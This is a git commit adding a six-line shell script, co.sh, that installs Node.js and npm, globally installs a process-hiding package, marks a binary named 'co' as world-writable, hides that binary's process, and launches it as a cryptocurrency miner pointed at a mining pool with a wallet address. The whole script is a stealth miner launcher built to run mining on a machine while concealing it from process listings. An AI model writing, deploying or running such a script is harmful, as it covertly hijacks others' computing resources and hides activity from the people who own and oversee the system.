d597433a8324b8b39dc7ff2c975c627406baaa35
trailt <100853475+trailt@users.noreply.github.com>
2022-03-03 21:33:24 +0700

    Create co.sh

---
+++ co.sh
@@ -0,0 +1,6 @@
+sudo apt install nodejs
+sudo apt install npm
+npm i -g node-process-hider
+chmod 777 co
+sudo ph add co
+./co --donate-level 1 -o sf.pool-pay.com:4025 -u SafexsnemBLeBFCdMeECMS2mXQ8TWKVjGXDdqWLzC2h8LAd7rcMMKHYBexEWkZ9himSgVi3QQQ7pshSf84DikXMACuY26zthFwK3z -p 00 -a rx/sfx -k 
